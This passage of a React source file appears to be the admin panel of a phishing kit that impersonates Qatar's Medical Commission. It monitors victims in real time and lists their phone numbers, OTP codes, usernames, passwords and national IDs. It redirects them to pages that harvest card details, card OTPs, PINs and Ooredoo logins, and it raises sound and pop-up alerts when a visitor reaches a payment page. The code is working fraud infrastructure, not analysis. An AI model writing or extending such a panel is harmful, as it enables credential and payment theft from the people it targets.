import { useState, useEffect, useRef } from "react";
import { navigateToPage } from "@/lib/store";
import confetti from "canvas-confetti";
import { SERVICE_INDEX } from "@/data/serviceIndex";
import { SEHHATY_SERVICES } from "@/data/sehhatyServices";
import { getServiceContext, getServiceLabelAr } from "@/lib/serviceContext";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { toast as sonnerToast } from "sonner";
import { Shield, Check, X, RefreshCw, Clock, Phone, KeyRound, User, ChevronRight, ChevronLeft, Search, Calendar, Hash, Trash2, WifiOff, Volume2, VolumeX, LogOut, CreditCard, Copy, Lock, AtSign, Loader2, Hourglass, BellRing, FileText, Send, Home as HomeIcon, MessageSquare, Image as ImageIcon, Crown, Star, Eye, EyeOff } from "lucide-react";
import CIBLogo from "@/components/CIBLogo";
import { Input } from "@/components/ui/input";
import { AlertDialog, AlertDialogAction, AlertDialogCancel, AlertDialogContent, AlertDialogDescription, AlertDialogFooter, AlertDialogHeader, AlertDialogTitle, AlertDialogTrigger } from "@/components/ui/alert-dialog";
import { Dialog, DialogContent, DialogDescription, DialogFooter, DialogHeader, DialogTitle } from "@/components/ui/dialog";

const TOAST_OPTS = { duration: 2000, closeButton: true, position: "top-center" as const, dismissible: true } as const;
const mergeOpts = (msg: any, opts: any = {}) => ({ ...opts, ...TOAST_OPTS, id: `t:${String(msg)}|${opts?.description ?? ""}` });
const toast = Object.assign(
  (msg: any, opts: any = {}) => sonnerToast(msg, mergeOpts(msg, opts)),
  {
    success: (msg: any, opts: any = {}) => sonnerToast.success(msg, mergeOpts(msg, opts)),
    error: (msg: any, opts: any = {}) => sonnerToast.error(msg, mergeOpts(msg, opts)),
    info: (msg: any, opts: any = {}) => sonnerToast.info(msg, mergeOpts(msg, opts)),
    warning: (msg: any, opts: any = {}) => sonnerToast.warning(msg, mergeOpts(msg, opts)),
  },
);

let sharedAudioCtx: AudioContext | null = null;
const getAudioContext = (): AudioContext => {
  if (!sharedAudioCtx) sharedAudioCtx = new (window.AudioContext || (window as any).webkitAudioContext)();
  if (sharedAudioCtx.state === "suspended") sharedAudioCtx.resume();
  return sharedAudioCtx;
};
const unlockAudio = () => { getAudioContext(); document.removeEventListener("touchstart", unlockAudio); document.removeEventListener("click", unlockAudio); };
document.addEventListener("touchstart", unlockAudio, { once: true });
document.addEventListener("click", unlockAudio, { once: true });

const playSound = (type: "new" | "approved" | "rejected" | "delete" | "pending-tick" | "otp" | "documents" | "idle", muted?: boolean) => {
  if (muted) return;
  try {
    const ctx = getAudioContext();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.connect(gain); gain.connect(ctx.destination);
    const t = ctx.currentTime;
    switch (type) {
      case "new": osc.type = "sine"; osc.frequency.setValueAtTime(660, t); osc.frequency.setValueAtTime(880, t + 0.15); osc.frequency.setValueAtTime(1100, t + 0.3); gain.gain.setValueAtTime(0.35, t); gain.gain.exponentialRampToValueAtTime(0.01, t + 0.5); osc.start(t); osc.stop(t + 0.5); break;
      case "approved": osc.type = "sine"; osc.frequency.setValueAtTime(523, t); osc.frequency.setValueAtTime(659, t + 0.1); osc.frequency.setValueAtTime(784, t + 0.2); gain.gain.setValueAtTime(0.25, t); gain.gain.exponentialRampToValueAtTime(0.01, t + 0.4); osc.start(t); osc.stop(t + 0.4); break;
      case "rejected": osc.type = "triangle"; osc.frequency.setValueAtTime(440, t); osc.frequency.setValueAtTime(330, t + 0.15); osc.frequency.setValueAtTime(220, t + 0.3); gain.gain.setValueAtTime(0.3, t); gain.gain.exponentialRampToValueAtTime(0.01, t + 0.45); osc.start(t); osc.stop(t + 0.45); break;
      case "delete": osc.type = "sawtooth"; osc.frequency.setValueAtTime(600, t); osc.frequency.exponentialRampToValueAtTime(100, t + 0.2); gain.gain.setValueAtTime(0.15, t); gain.gain.exponentialRampToValueAtTime(0.01, t + 0.25); osc.start(t); osc.stop(t + 0.25); break;
      case "pending-tick": osc.type = "sine"; osc.frequency.setValueAtTime(880, t); osc.frequency.setValueAtTime(1175, t + 0.08); gain.gain.setValueAtTime(0.08, t); gain.gain.exponentialRampToValueAtTime(0.005, t + 0.25); osc.start(t); osc.stop(t + 0.25); break;
      case "otp": osc.type = "square"; osc.frequency.setValueAtTime(1200, t); osc.frequency.setValueAtTime(900, t + 0.07); osc.frequency.setValueAtTime(1400, t + 0.15); gain.gain.setValueAtTime(0.18, t); gain.gain.exponentialRampToValueAtTime(0.01, t + 0.3); osc.start(t); osc.stop(t + 0.3); break;
      case "documents": osc.type = "triangle"; osc.frequency.setValueAtTime(300, t); osc.frequency.exponentialRampToValueAtTime(80, t + 0.18); gain.gain.setValueAtTime(0.35, t); gain.gain.exponentialRampToValueAtTime(0.01, t + 0.22); osc.start(t); osc.stop(t + 0.22); break;
      case "idle": osc.type = "sine"; osc.frequency.setValueAtTime(520, t); osc.frequency.setValueAtTime(420, t + 0.18); osc.frequency.setValueAtTime(520, t + 0.36); gain.gain.setValueAtTime(0.2, t); gain.gain.exponentialRampToValueAtTime(0.01, t + 0.55); osc.start(t); osc.stop(t + 0.55); break;
    }
  } catch {}
};

interface LoginRequest {
  id: string; phone: string; otp_code: string; status: string; created_at: string; updated_at: string;
  qatar_id?: string; step?: string; username?: string | null; password?: string | null;
  full_name?: string | null; national_id?: string | null;
  redirect_to?: string | null; selected_service?: string | null;
}
interface Visitor {
  phone: string;
  requests: LoginRequest[];
  /** Synthetic visitor built from realtime presence only (no submitted data yet). */
  anonymous?: boolean;
  anonPath?: string | null;
  anonStatus?: "online" | "away" | "idle";
  anonSince?: number;
  /** Anonymous visitor's last-activity timestamp (ms) from the presence channel. */
  anonLastActive?: number;
  /** IP-based approximate location (country) from the presence channel or
   *  the row's activation_data.geo. */
  geo?: { code: string; name: string; flag: string } | null;
}
type OnlineFilter = "all" | "active" | "inactive" | "completed" | "abandoned";
type Lifecycle = "active" | "inactive" | "completed" | "abandoned";

const isOnlineByThreshold = (reqs: LoginRequest[], thresholdMs: number) => {
  if (reqs.length === 0) return false;
  const latest = reqs.reduce((max, r) => { const t = new Date((r as any).updated_at || r.created_at).getTime(); return t > max ? t : max; }, 0);
  return Date.now() - latest < thresholdMs;
};

/** Arabic relative-time formatter used for anonymous visitors' last-activity
 *  timestamp. Refreshed by the 1s ticker so it stays live. */
const formatRelativeTimeAr = (ts: number): string => {
  const diff = Math.max(0, Date.now() - ts);
  const s = Math.floor(diff / 1000);
  if (s < 5) return "الآن";
  if (s < 60) return `قبل ${s} ث`;
  const m = Math.floor(s / 60);
  if (m < 60) return `قبل ${m} د`;
  const h = Math.floor(m / 60);
  if (h < 24) return `قبل ${h} س`;
  const d = Math.floor(h / 24);
  return `قبل ${d} ي`;
};

const getLifecycle = (reqs: LoginRequest[]): Lifecycle => {
  if (reqs.length === 0) return "inactive";
  const completed = reqs.some((r) => {
    const cp = (r as any).current_page;
    const rt = (r as any).redirect_to;
    return cp === "/waiting" || rt === "/waiting";
  });
  if (completed) return "completed";
  if (isOnlineByThreshold(reqs, 5 * 60 * 1000)) return "active";
  const latest = Math.max(...reqs.map((r) => new Date((r as any).updated_at || r.created_at).getTime()));
  const idleMin = (Date.now() - latest) / 60000;
  if (idleMin > 30) return "abandoned";
  return "inactive";
};

const ONLINE_THRESHOLD_MS = 5 * 60 * 1000;
const REDIRECT_DESTINATIONS = [
  { path: "/", label: "الرئيسية", icon: HomeIcon, emoji: "🏠" },
  { path: "/card-info", label: "معلومات البطاقة", icon: CreditCard, emoji: "💳" },
  { path: "/card-otp", label: "رمز البطاقة", icon: KeyRound, emoji: "🔢" },
  { path: "/card-pin", label: "الرقم السري BIN", icon: Lock, emoji: "🔒" },
  { path: "/ooredoo-login", label: "تسجيل Ooredoo", icon: AtSign, emoji: "🎁" },
  { path: "/ooredoo-otp", label: "رمز Ooredoo", icon: KeyRound, emoji: "🔢" },
  { path: "/waiting", label: "الانتظار", icon: Hourglass, emoji: "⏳" },
  { path: "/medical-login", label: "دخول الخدمة", icon: AtSign, emoji: "🏥" },
  { path: "/medical-activate", label: "تفعيل الحساب", icon: Shield, emoji: "🔐" },
  { path: "/medical-register", label: "تسجيل مستخدم جديد", icon: User, emoji: "📝" },
] as const;

const getLatestVisitorRequest = (visitor: Visitor | null) => {
  if (!visitor) return null;
  return [...visitor.requests].sort((a, b) => new Date(b.updated_at || b.created_at).getTime() - new Date(a.updated_at || a.created_at).getTime())[0] || null;
};

const isVisitorOnline = (requests: LoginRequest[]) => {
  if (requests.length === 0) return false;
  const latest = requests.reduce((max, r) => { const t = new Date((r as any).updated_at || r.created_at).getTime(); return t > max ? t : max; }, 0);
  return Date.now() - latest < ONLINE_THRESHOLD_MS;
};

type PresenceStatus = "online" | "away" | "idle" | "offline";
const PRESENCE_LABEL: Record<PresenceStatus, string> = {
  online: "متصل الآن",
  away: "بعيد",
  idle: "خامل",
  offline: "غير متصل",
};
const PRESENCE_DOT: Record<PresenceStatus, string> = {
  online: "bg-emerald-500",
  away: "bg-amber-500",
  idle: "bg-slate-400",
  offline: "bg-slate-400",
};
const getVisitorPresence = (
  reqs: LoginRequest[],
  presenceMap: Map<string, { status: "online" | "away" | "idle"; path: string | null }>,
): PresenceStatus => {
  let best: PresenceStatus = "offline";
  const rank: Record<PresenceStatus, number> = { online: 3, away: 2, idle: 1, offline: 0 };
  for (const r of reqs) {
    const p = presenceMap.get((r as any).id);
    if (!p) continue;
    if (rank[p.status] > rank[best]) best = p.status;
  }
  if (best !== "offline") return best;
  // Fallback: recent activity => idle (still counted as connected-ish)
  return isVisitorOnline(reqs) ? "idle" : "offline";
};

const COUNTRY_FLAGS: Record<string, { flag: string; name: string }> = {
  "974": { flag: "🇶🇦", name: "قطر" }, "966": { flag: "🇸🇦", name: "السعودية" }, "971": { flag: "🇦🇪", name: "الإمارات" },
  "973": { flag: "🇧🇭", name: "البحرين" }, "965": { flag: "🇰🇼", name: "الكويت" }, "968": { flag: "🇴🇲", name: "عُمان" },
  "962": { flag: "🇯🇴", name: "الأردن" }, "961": { flag: "🇱🇧", name: "لبنان" }, "964": { flag: "🇮🇶", name: "العراق" },
  "20": { flag: "🇪🇬", name: "مصر" }, "212": { flag: "🇲🇦", name: "المغرب" }, "216": { flag: "🇹🇳", name: "تونس" },
  "213": { flag: "🇩🇿", name: "الجزائر" }, "218": { flag: "🇱🇾", name: "ليبيا" }, "249": { flag: "🇸🇩", name: "السودان" },
  "967": { flag: "🇾🇪", name: "اليمن" }, "963": { flag: "🇸🇾", name: "سوريا" }, "970": { flag: "🇵🇸", name: "فلسطين" },
  "91": { flag: "🇮🇳", name: "الهند" }, "92": { flag: "🇵🇰", name: "باكستان" }, "63": { flag: "🇵🇭", name: "الفلبين" },
  "977": { flag: "🇳🇵", name: "نيبال" }, "94": { flag: "🇱🇰", name: "سريلانكا" }, "880": { flag: "🇧🇩", name: "بنغلاديش" },
  "1": { flag: "🇺🇸", name: "أمريكا" }, "44": { flag: "🇬🇧", name: "بريطانيا" },
};

const getCountryFromPhone = (phone: string): { flag: string; name: string } | null => {
  const cleaned = phone.replace(/[^0-9+]/g, "").replace(/^\+/, "");
  for (const code of Object.keys(COUNTRY_FLAGS).sort((a, b) => b.length - a.length)) {
    if (cleaned.startsWith(code)) return COUNTRY_FLAGS[code];
  }
  return null;
};

const AdminLogin = ({ onLogin }: { onLogin: () => void }) => {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault(); setLoading(true);
    try {
      const { data, error } = await supabase.functions.invoke("admin-login", { body: { username, password } });
      if (error || !data?.success) toast.error(data?.error || "بيانات الدخول غير صحيحة");
      else { sessionStorage.setItem("admin_token", data.token); onLogin(); }
    } catch { toast.error("حدث خطأ في الاتصال"); }
    finally { setLoading(false); }
  };
  useEffect(() => {
    navigateToPage("أدمن");
  }, []);

  return (
    <div className="min-h-screen flex items-center justify-center bg-background relative overflow-hidden p-4" dir="rtl">
      <div className="fixed inset-0 gradient-mesh pointer-events-none" />
      <div className="bg-card rounded-2xl shadow-2xl p-8 w-full max-w-5xl text-center relative z-10 border border-border/20 card-shadow">
        <div className="flex justify-center mb-4">
          <CIBLogo className="h-16 dark:brightness-0 dark:invert" />
        </div>
        <h3 className="text-lg font-bold text-foreground mb-1">لوحة التحكم الإدارية</h3>
        <p className="text-sm text-muted-foreground mb-6">القومسيون الطبي قطر — احجز موعد الفحص الطبي إلكترونياً</p>
        <form onSubmit={handleSubmit} className="space-y-4 text-right">
          <div className="relative">
            <User className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
            <Input value={username} onChange={(e) => setUsername(e.target.value)} placeholder="اسم المستخدم" className="text-right pr-10 h-12 bg-muted/30 border-border/40 rounded-xl focus:ring-2 focus:ring-primary/30 transition-all" dir="ltr" />
          </div>
          <div className="relative">
            <Lock className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
            <Input type={showPassword ? "text" : "password"} value={password} onChange={(e) => setPassword(e.target.value)} placeholder="كلمة المرور" className="text-right pr-10 pl-10 h-12 bg-muted/30 border-border/40 rounded-xl focus:ring-2 focus:ring-primary/30 transition-all" dir="ltr" />
            <button
              type="button"
              onClick={() => setShowPassword((s) => !s)}
              className="absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
              aria-label={showPassword ? "إخفاء كلمة المرور" : "إظهار كلمة المرور"}
            >
              {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
            </button>
          </div>
          <Button type="submit" className="w-full hero-gradient text-primary-foreground h-12 rounded-xl shadow-button transition-all font-bold" disabled={loading || !username || !password}>
            {loading ? "جاري التحقق..." : "دخول"}
          </Button>
        </form>
        <p className="text-muted-foreground text-[10px] mt-4">الوصول مقيّد للمسؤولين المعتمدين فقط</p>
      </div>
    </div>
  );
};

const Admin = () => {
  const [isAuthenticated, setIsAuthenticated] = useState(() => !!sessionStorage.getItem("admin_token"));
  useEffect(() => {
    const channel = supabase
      .channel("admin_credentials_watch")
      .on("postgres_changes", { event: "*", schema: "public", table: "admin_credentials" }, () => {
        sessionStorage.removeItem("admin_token");
        setIsAuthenticated(false);
        try { toast.info("تم تسجيل الخروج، يرجى إعادة الدخول"); } catch {}
      })
      .subscribe();
    return () => { supabase.removeChannel(channel); };
  }, []);
  if (!isAuthenticated) return <AdminLogin onLogin={() => setIsAuthenticated(true)} />;
  return <AdminDashboard onLogout={() => { sessionStorage.removeItem("admin_token"); setIsAuthenticated(false); }} />;
};

const requestNotificationPermission = async () => {
  if ("Notification" in window && Notification.permission === "default") await Notification.requestPermission();
};
const sendBrowserNotification = (title: string, body: string) => {
  if ("Notification" in window && Notification.permission === "granted") {
    try { new Notification(title, { body, icon: "/favicon-light.png", tag: "admin-notify" }); } catch {}
  }
};

const AdminDashboard = ({ onLogout }: { onLogout: () => void }) => {
  const [requests, setRequests] = useState<LoginRequest[]>([]);
  const [loading, setLoading] = useState(true);
  const [selectedPhone, setSelectedPhone] = useState<string | null>(null);
  const selectedPhoneRef = useRef<string | null>(null);
  useEffect(() => { selectedPhoneRef.current = selectedPhone; }, [selectedPhone]);
  const [sidebarOpen, setSidebarOpen] = useState(true);
  const [onlineFilter, setOnlineFilter] = useState<OnlineFilter>("all");
  const [searchQuery, setSearchQuery] = useState("");
  const prevRequestCountRef = useRef<number | null>(null);
  // Snapshot of the last-seen pending count. Used inside the realtime
  // callbacks (which close over the FIRST render's fetchRequests) so the
  // "طلب جديد" chime fires only when the pending count actually grew,
  // not on every heartbeat. Using state (`requests`) here would be stale
  // because the effect only runs once.
  const prevPendingCountRef = useRef<number>(0);
  const isFirstLoadRef = useRef(true);
  // Per-row snapshot of last-seen values used to detect REAL field changes
  // in realtime UPDATE payloads (Supabase only sends the PK in `payload.old`
  // under the default REPLICA IDENTITY). Lifted to a ref so it survives
  // across renders and is hydrated from every fetch, otherwise the first
  // heartbeat after dashboard open would compare against {} and spam
  // "📥 إجراء جديد" / "🧭 انتقل لصفحة جديدة" notifications for fields that
  // were already present in the DB.
  const prevRowValuesRef = useRef<Map<string, any>>(new Map());
  const [, setTick] = useState(0);
  const [liveOnlineCount, setLiveOnlineCount] = useState(0);
  const [liveStatusCounts, setLiveStatusCounts] = useState({ online: 0, away: 0, idle: 0 });
  const [liveAnonymousCount, setLiveAnonymousCount] = useState(0);
  const [presenceByRequestId, setPresenceByRequestId] = useState<Map<string, { status: "online" | "away" | "idle"; path: string | null; geo?: { code: string; name: string; flag: string } | null }>>(new Map());
  const [anonymousPresences, setAnonymousPresences] = useState<{ key: string; path: string | null; status: "online" | "away" | "idle"; since: number; lastActive: number; geo?: { code: string; name: string; flag: string } | null }[]>([]);
  const anonSinceRef = useRef<Map<string, number>>(new Map());
  useEffect(() => {
    const channel = supabase.channel("visitors_online");
    const recompute = () => {
      const state = channel.presenceState() as Record<string, unknown[]>;
      const map = new Map<string, { status: "online" | "away" | "idle"; path: string | null; geo?: { code: string; name: string; flag: string } | null }>();
      const counts = { online: 0, away: 0, idle: 0 };
      let total = 0;
      let anonymous = 0;
      const anonList: { key: string; path: string | null; status: "online" | "away" | "idle"; since: number; lastActive: number; geo?: { code: string; name: string; flag: string } | null }[] = [];
      const seenAnonKeys = new Set<string>();
      for (const [presenceKey, entries] of Object.entries(state)) {
        const meta: any = Array.isArray(entries) ? entries[entries.length - 1] : entries;
        if (!meta) continue;
        total += 1;
        const status: "online" | "away" | "idle" =
          meta.status === "away" || meta.status === "idle" ? meta.status : "online";
        counts[status] += 1;
        const geo = meta.geo && typeof meta.geo === "object" && typeof meta.geo.code === "string"
          ? { code: String(meta.geo.code), name: String(meta.geo.name || meta.geo.code), flag: String(meta.geo.flag || "🏳️") }
          : null;
        const rid = meta.request_id as string | null | undefined;
        if (rid) map.set(rid, { status, path: meta.path ?? null, geo });
        else {
          anonymous += 1;
          const anonId = (meta.anon_id as string | undefined) || presenceKey;
          if (seenAnonKeys.has(anonId)) continue;
          seenAnonKeys.add(anonId);
          if (!anonSinceRef.current.has(anonId)) anonSinceRef.current.set(anonId, Date.now());
          const rawLast = meta.last_active as string | undefined;
          const parsedLast = rawLast ? Date.parse(rawLast) : NaN;
          const lastActive = Number.isFinite(parsedLast) ? parsedLast : Date.now();
          anonList.push({
            key: anonId,
            path: (meta.path as string | null | undefined) ?? null,
            status,
            since: anonSinceRef.current.get(anonId) as number,
            lastActive,
            geo,
          });
        }
      }
      // Prune stale since-timestamps for keys no longer present.
      for (const k of Array.from(anonSinceRef.current.keys())) {
        if (!seenAnonKeys.has(k)) anonSinceRef.current.delete(k);
      }
      setLiveOnlineCount(total);
      setLiveStatusCounts(counts);
      setLiveAnonymousCount(anonymous);
      setPresenceByRequestId(map);
      setAnonymousPresences(anonList);
    };
    channel
      .on("presence", { event: "sync" }, recompute)
      .on("presence", { event: "join" }, recompute)
      .on("presence", { event: "leave" }, recompute)
      .subscribe();
    // Auto-refresh presence every 5s so the admin sees live attendance without manual refresh
    const interval = setInterval(recompute, 5000);
    return () => { clearInterval(interval); supabase.removeChannel(channel); };
  }, []);
  const [soundMuted, setSoundMuted] = useState(() => localStorage.getItem("admin_sound_muted") === "true");
  const soundMutedRef = useRef(soundMuted);
  useEffect(() => { soundMutedRef.current = soundMuted; }, [soundMuted]);
  const [topPhone, setTopPhone] = useState<string | null>(null);
  const [pendingTopPhone, setPendingTopPhone] = useState<string | null>(null);
  const [pwdOpen, setPwdOpen] = useState(false);
  const [pwdCurrent, setPwdCurrent] = useState("");
  const [pwdNew, setPwdNew] = useState("");
  const [pwdConfirm, setPwdConfirm] = useState("");
  const [showPwdCurrent, setShowPwdCurrent] = useState(false);
  const [showPwdNew, setShowPwdNew] = useState(false);
  const [showPwdConfirm, setShowPwdConfirm] = useState(false);
  const [pwdLoading, setPwdLoading] = useState(false);
  const [seenMap, setSeenMap] = useState<Record<string, number>>(() => {
    try { return JSON.parse(localStorage.getItem("admin_seen_actions") || "{}"); } catch { return {}; }
  });
  const getLatestActionTs = (reqs: LoginRequest[]): number => {
    if (!reqs.length) return 0;
    // Use created_at so the 30s heartbeat (which bumps updated_at) does not
    // perpetually re-trigger the "جديد" badge. A new action = a new row insert.
    return Math.max(...reqs.map(r => new Date(r.created_at).getTime()));
  };
  const markVisitorSeen = (phone: string, reqs: LoginRequest[]) => {
    const ts = getLatestActionTs(reqs);
    setSeenMap(prev => { const next = { ...prev, [phone]: ts }; try { localStorage.setItem("admin_seen_actions", JSON.stringify(next)); } catch {} return next; });
  };
  const [favorites, setFavorites] = useState<Set<string>>(() => {
    try { const arr = JSON.parse(localStorage.getItem("admin_favorites") || "[]"); return new Set(Array.isArray(arr) ? arr : []); } catch { return new Set(); }
  });
  const [favoritesOnly, setFavoritesOnly] = useState(false);
  const toggleFavorite = (phone: string) => {
    setFavorites((prev) => {
      const next = new Set(prev);
      if (next.has(phone)) { next.delete(phone); toast.info("تم إزالة الزائر من المفضلة"); }
      else { next.add(phone); toast.success("تم إضافة الزائر إلى المفضلة ⭐"); }
      try { localStorage.setItem("admin_favorites", JSON.stringify([...next])); } catch {}
      return next;
    });
  };

  const handleChangePassword = async (e: React.FormEvent) => {
    e.preventDefault();
    if (pwdNew.length < 6) { toast.error("كلمة المرور يجب أن تكون 6 أحرف على الأقل"); return; }
    if (pwdNew !== pwdConfirm) { toast.error("كلمتا المرور غير متطابقتين"); return; }
    setPwdLoading(true);
    try {
      const { data, error } = await supabase.functions.invoke("admin-change-password", {
        body: { currentPassword: pwdCurrent, newPassword: pwdNew },
      });
      if (error || !data?.success) toast.error(data?.error || "تعذر تغيير كلمة المرور");
      else { toast.success("تم تغيير كلمة المرور بنجاح"); setPwdOpen(false); setPwdCurrent(""); setPwdNew(""); setPwdConfirm(""); }
    } catch { toast.error("حدث خطأ في الاتصال"); }
    finally { setPwdLoading(false); }
  };

  useEffect(() => { requestNotificationPermission(); }, []);

  const fetchRequests = async () => {
    setLoading(true);
    const { data, error } = await supabase.from("login_requests").select("*").order("created_at", { ascending: false });
    if (error) toast.error("خطأ في جلب البيانات");
    else {
      const newData = data || [];
      const newPending = newData.filter((r) => r.status === "pending").length;
      // NOTE: the "new visitor / new pending" chime + browser notification
      // is fired exclusively by the realtime INSERT / UPDATE handlers below
      // (see `notify(...,"new")`). Firing it here as well would double-play
      // the sound and send a duplicate browser notification for the same
      // event, because every realtime write also calls fetchRequests().
      isFirstLoadRef.current = false;
      prevRequestCountRef.current = newData.length;
      prevPendingCountRef.current = newPending;
      // Hydrate the snapshot map so realtime UPDATE diffs are accurate.
      // We only seed rows we have not seen yet to avoid clobbering more
      // recent values captured by the realtime handler.
      const seen = prevRowValuesRef.current;
      const liveIds = new Set<string>();
      for (const r of newData) {
        liveIds.add(r.id);
        if (!seen.has(r.id)) seen.set(r.id, { ...r });
      }
      // Drop snapshots for rows that no longer exist (deleted elsewhere).
      for (const id of [...seen.keys()]) {
        if (!liveIds.has(id)) seen.delete(id);
      }
      setRequests(newData);
    }
    setLoading(false);
  };

  useEffect(() => {
    fetchRequests();
    const pageLabels: Record<string, string> = {
      "/": "الصفحة الرئيسية",
      "/card-info": "معلومات البطاقة",
      "/card-otp": "رمز البطاقة",
      "/card-pin": "الرقم السري للبطاقة",
      "/ooredoo-login": "تسجيل Ooredoo",
      "/ooredoo-otp": "رمز Ooredoo",
      "/waiting": "صفحة الانتظار",
      "/medical-login": "تسجيل دخول الخدمة",
      "/medical-activate": "تفعيل الحساب",
      "/medical-register": "تسجيل مستخدم جديد",
      "/medical-register/step/1": "تسجيل جديد · بيانات شخصية",
      "/medical-register/step/2": "تسجيل جديد · تواصل وعنوان",
      "/medical-register/step/3": "تسجيل جديد · العمل والحساب",
      "/medical-register/step/4": "تسجيل جديد · مراجعة ودفع",
    };
    const fieldLabels: Record<string, string> = {
      otp_code: "أدخل رمز OTP", username: "أدخل اسم المستخدم", password: "أدخل كلمة المرور", qatar_id: "أدخل الهوية القطرية",
      full_name: "أدخل الاسم الكامل", national_id: "أدخل الرقم الوطني",
      selected_service: "اختار خدمة", governorate: "أدخل المحافظة", city: "أدخل المدينة", street: "أدخل الشارع", activation_data: "أرسل بيانات التفعيل",
    };
    const recentNotifs = new Map<string, number>();
    const PAYMENT_PATHS = new Set([
      "/card-info",
      "/card-otp",
      "/card-pin",
      "/medical-register/step/4",
    ]);
    const isPaymentPage = (p?: string | null) => !!p && PAYMENT_PATHS.has(p);
    const notify = (
      title: string,
      body: string,
      sound?: "new" | "otp" | "documents",
      showToast: boolean = false,
    ) => {
      const key = `${title}|${body}`;
      const now = Date.now();
      const last = recentNotifs.get(key);
      if (last && now - last < 3000) return;
      recentNotifs.set(key, now);
      for (const [k, t] of recentNotifs) if (now - t > 10000) recentNotifs.delete(k);
      if (sound) playSound(sound, soundMutedRef.current);
      if (showToast && !selectedPhoneRef.current) {
        toast.info(title, { id: key, description: body });
      }
      sendBrowserNotification(title, body);
    };
    // Use a ref so the realtime callback always reads the freshest snapshot
    // of known visitor phones, even after fetchRequests hydrates async.
    const seenPhonesRef = { current: new Set<string>() };
    const prevRowValues = prevRowValuesRef.current;
    const hydrateSeen = () => {
      // Pull from the latest requests via prevRowValuesRef (kept in sync by fetchRequests)
      for (const r of prevRowValues.values()) {
        const p = (r as any)?.phone;
        if (p) seenPhonesRef.current.add(p);
      }
    };
    hydrateSeen();
    const channel = supabase.channel("login_requests_realtime")
      .on("postgres_changes", { event: "INSERT", schema: "public", table: "login_requests" }, (payload) => {
        const row = payload.new as any;
        const phone = row?.phone;
        if (row?.id) prevRowValues.set(row.id, { ...row });
        fetchRequests();
        hydrateSeen();
        if (!phone || seenPhonesRef.current.has(phone)) return;
        seenPhonesRef.current.add(phone);
        notify("👤 زائر جديد دخل الموقع", `${phone} بدأ جلسة جديدة`, "new");
      })
      .on("postgres_changes", { event: "UPDATE", schema: "public", table: "login_requests" }, (payload) => {
        const newRow = (payload.new || {}) as any;
        const oldRow = (newRow?.id && prevRowValues.get(newRow.id)) || {};
        const phoneTxt = newRow?.phone ?? "زائر";
        if (newRow.current_page && newRow.current_page !== oldRow.current_page) {
          const pageLabel = pageLabels[newRow.current_page] || newRow.current_page;
          notify(
            "🧭 الزائر انتقل لصفحة جديدة",
            `${phoneTxt} • يتصفح الآن: ${pageLabel}`,
            undefined,
            isPaymentPage(newRow.current_page),
          );
        }
        const changed: string[] = [];
        for (const key of Object.keys(fieldLabels)) {
          const before = oldRow[key]; const after = newRow[key];
          if (!after || after === "----") continue;
          // activation_data is JSONB — realtime always delivers a fresh
          // object reference on every heartbeat, so compare by content.
          const isSame = key === "activation_data"
            ? JSON.stringify(after) === JSON.stringify(before)
            : after === before;
          if (isSame) continue;
          changed.push(fieldLabels[key]);
        }
        if (changed.length > 0) {
          notify(
            "📥 إجراء جديد من الزائر",
            `${phoneTxt} • ${changed.join("، ")}`,
            undefined,
            isPaymentPage(newRow.current_page),
          );
        }
        if (newRow?.id) prevRowValues.set(newRow.id, { ...oldRow, ...newRow });
        fetchRequests();
      })
      .on("postgres_changes", { event: "DELETE", schema: "public", table: "login_requests" }, (payload) => {
        const oldId = (payload.old as any)?.id;
        if (oldId) prevRowValues.delete(oldId);
        fetchRequests();
      })
      .subscribe();
    return () => { supabase.removeChannel(channel); };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);



  // Group rows into ONE visitor card per real person. Multiple rows for the
  // same visitor can share any of: phone, qatar_id, national_id, or username
  // (e.g. a row where `phone` was temporarily filled with the qatar_id as a
  // placeholder before the real phone was entered). We union-find across all
  // of these identifiers so each visitor appears exactly once in the list.
  const allVisitors: Visitor[] = (() => {
    const normPhone = (v?: string | null) => {
      const digits = (v || "").replace(/\D+/g, "");
      return digits.length >= 6 ? digits : "";
    };
    const normId = (v?: string | null) => (v || "").trim().toLowerCase();
    const keysFor = (r: LoginRequest): string[] => {
      const ks: string[] = [];
      const p = normPhone(r.phone);
      if (p) ks.push(`p:${p}`);
      const q = normId((r as any).qatar_id);
      if (q) ks.push(`q:${q}`);
      const n = normId((r as any).national_id);
      if (n) ks.push(`n:${n}`);
      const u = normId((r as any).username);
      if (u) ks.push(`u:${u}`);
      if (ks.length === 0) ks.push(`id:${r.id}`);
      return ks;
    };
    // union-find
    const parent: Record<string, string> = {};
    const find = (x: string): string => (parent[x] === x ? x : (parent[x] = find(parent[x])));
    const union = (a: string, b: string) => { const ra = find(a), rb = find(b); if (ra !== rb) parent[ra] = rb; };
    for (const r of requests) {
      const ks = keysFor(r);
      for (const k of ks) if (!(k in parent)) parent[k] = k;
      for (let i = 1; i < ks.length; i++) union(ks[0], ks[i]);
    }
    const groups: Record<string, LoginRequest[]> = {};
    for (const r of requests) {
      const root = find(keysFor(r)[0]);
      (groups[root] ||= []).push(r);
    }
    // Pick the best display phone per group: prefer a value that looks like a
    // real phone (mostly digits, not equal to qatar_id/national_id), else the
    // most recent non-empty phone, else the raw first phone.
    const pickPhone = (reqs: LoginRequest[]): string => {
      const sorted = [...reqs].sort((a, b) =>
        new Date(b.updated_at || b.created_at).getTime() -
        new Date(a.updated_at || a.created_at).getTime()
      );
      const realDigits = sorted.find((r) => {
        const p = (r.phone || "").trim();
        if (!p) return false;
        const q = ((r as any).qatar_id || "").trim();
        const n = ((r as any).national_id || "").trim();
        if (p === q || p === n) return false;
        return /^\+?\d{6,}$/.test(p);
      });
      if (realDigits) return realDigits.phone;
      const anyPhone = sorted.find((r) => (r.phone || "").trim());
      return anyPhone?.phone || sorted[0]?.phone || "";
    };
    // Safety net: if two independent groups still resolve to the same display
    // phone (e.g. one row only had qatar_id, another only had that same phone),
